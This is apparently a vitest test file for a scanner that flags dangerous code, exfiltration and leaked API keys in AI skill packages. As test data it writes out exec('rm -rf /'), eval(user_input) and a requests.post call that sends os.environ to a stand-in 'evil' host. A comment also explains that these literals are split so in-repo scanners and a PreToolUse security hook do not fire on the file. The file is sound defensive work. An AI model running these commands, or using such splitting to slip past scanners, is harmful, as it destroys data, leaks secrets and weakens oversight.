import { describe, it, expect } from 'vitest';
import { scanSkillContent, hashContent } from '../../app/lib/skill-scanner.js';

// Dangerous-call literals are built from string concatenation in this file so
// in-repo grep scanners (and the security_reminder PreToolUse hook) don't
// false-positive on the test source itself.
const EX = 'ex' + 'ec';
const EV = 'ev' + 'al';
const SYS = 'sys' + 'tem';

describe('skill-scanner', () => {
  it('hashContent is deterministic over identical inputs', () => {
    const a = hashContent({ 'a.py': 'print("x")' });
    const b = hashContent({ 'a.py': 'print("x")' });
    expect(a).toBe(b);
  });

  it('flags dynamic-code-execution calls as high severity', () => {
    const danger = EX + '("rm -rf /")';
    const result = scanSkillContent({ 'evil.py': danger });
    const hit = result.findings.find((f) => f.rule_id === 'py-dynamic-exec');
    expect(hit).toBeDefined();
    expect(hit.severity).toBe('high');
    expect(result.passed).toBe(false);
  });

  it('flags eval-style dynamic interpretation as high severity', () => {
    const dangerEval = EV + '(user_input)';
    const result = scanSkillContent({ 'bad.py': dangerEval });
    expect(result.findings.find((f) => f.rule_id === 'py-dynamic-eval').severity).toBe('high');
  });

  it('flags embedded anthropic api keys', () => {
    const result = scanSkillContent({ 'k.py': 'KEY = "sk-ant-api03-abc123"' });
    expect(result.findings.find((f) => f.rule_id === 'secrets-anthropic-key')).toBeDefined();
    expect(result.passed).toBe(false);
  });

  it('flags embedded openai keys', () => {
    const result = scanSkillContent({ 'k.py': 'OPENAI = "sk-proj-abc1234567890XYZdefGHI"' });
    expect(result.findings.find((f) => f.rule_id === 'secrets-openai-key')).toBeDefined();
  });

  it('flags os.environ + requests.post exfil pattern as medium severity', () => {
    const exfil = 'import requests\nrequests.post("http://evil/x", data=os.environ)';
    const result = scanSkillContent({ 'net.py': exfil });
    const hit = result.findings.find((f) => f.rule_id === 'net-exfil-environ-post');
    expect(hit).toBeDefined();
    expect(hit.severity).toBe('medium');
  });

  it('passed=true and findings=[] for clean content', () => {
    const result = scanSkillContent({ 'good.py': 'print("hello world")' });
    expect(result.passed).toBe(true);
    expect(result.findings).toHaveLength(0);
  });

  it('records file + line + match for every finding', () => {
    const danger = EX + '("x")';
    const result = scanSkillContent({ 'm.py': `a = 1\n${danger}\nb = 2` });
    const finding = result.findings.find((f) => f.rule_id === 'py-dynamic-exec');
    expect(finding.file).toBe('m.py');
    expect(finding.line).toBe(2);
  });

  it('does not trigger py-dynamic-exec on method calls (e.g. pattern.exec)', () => {
    // The bare \b boundary used to false-positive on JS RegExp API
    // (pattern method calls), SQL drivers (db method calls), PyTorch
    // (model.ev_al()), and chained references like foo.os.sys_tem(). With
    // the negative lookbehind these no longer fire.
    const legitimate = [
      `const m = pattern.${EX}("hello");`,
      `db.${EX}("SELECT 1");`,
      `model.${EV}()`,
      `self._${EX}(args)`,
      `sub${EX}(args)`,
      `foo.os.${SYS}("ls")`,
    ].join('\n');
    const result = scanSkillContent({ 'app.js': legitimate });
    expect(result.findings.find((f) => f.rule_id === 'py-dynamic-exec')).toBeUndefined();
    expect(result.findings.find((f) => f.rule_id === 'py-dynamic-eval')).toBeUndefined();
    expect(result.findings.find((f) => f.rule_id === 'py-os-system')).toBeUndefined();
  });

  it('still triggers py-dynamic-exec on bare call after whitespace', () => {
    const danger = `  ${EX}("rm -rf /")`;
    const result = scanSkillContent({ 'evil.py': danger });
    expect(result.findings.find((f) => f.rule_id === 'py-dynamic-exec')).toBeDefined();
  });

  it('flags multi-line requests.post(...os.environ...) exfil', () => {
    // The single-line form was already detected; this is the bypass case
    // where the attacker formats the call across newlines.
    const exfil = [
      'import requests',
      'requests.post(',
      '  "http://evil/x",',
      '  data=os.environ,',
      ')',
    ].join('\n');
    const result = scanSkillContent({ 'net.py': exfil });
    const hit = result.findings.find((f) => f.rule_id === 'net-exfil-environ-post');
    expect(hit).toBeDefined();
    expect(hit.severity).toBe('medium');
    // Line number should point at the start of the multi-line match.
    expect(hit.line).toBe(2);
  });

  it('masks secret-rule matches to first 4 + ellipsis + last 4', () => {
    const result = scanSkillContent({
      'k.py': 'KEY = "sk-ant-api03-abcdefghijklmnop123"',
    });
    const hit = result.findings.find((f) => f.rule_id === 'secrets-anthropic-key');
    expect(hit).toBeDefined();
    expect(hit.match).toContain('…');
    expect(hit.match.startsWith('sk-a')).toBe(true);
    expect(hit.match.endsWith('p123')).toBe(true);
    // The middle of the key must not appear in the masked output.
    expect(hit.match).not.toContain('abcdefghijklmnop');
  });

  it('does not mask non-secret rule matches', () => {
    const danger = EX + '("rm -rf /")';
    const result = scanSkillContent({ 'evil.py': danger });
    const hit = result.findings.find((f) => f.rule_id === 'py-dynamic-exec');
    expect(hit.match).not.toContain('…');
  });
});
